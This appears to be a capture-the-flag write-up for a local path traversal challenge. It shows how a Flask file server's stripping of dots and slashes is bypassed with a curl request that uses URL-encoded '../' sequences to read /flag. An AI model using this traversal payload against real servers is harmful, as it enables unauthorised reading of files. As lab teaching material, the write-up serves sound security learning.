# Path Traversal 1

```shell
cat /challenge/server
```

The server is a Flask app that, on receiving requests at `/data/<path>`, serves the file at `/challenge/files/path`
We know that the flag is at `/flag`
This time the server strips any leading and trailing "." or "/", so can't use the previous solution.

```shell
ls /challenge/files
```

The challenge files contain a directory `fortunes/`. We can use this as the start of the path string.
Start the server and use curl:

```shell
curl -v http://challenge.localhost:80/data/fortunes/..%2F..%2F..%2Fflag
```

"..%2F" is URL-encoding of "../"
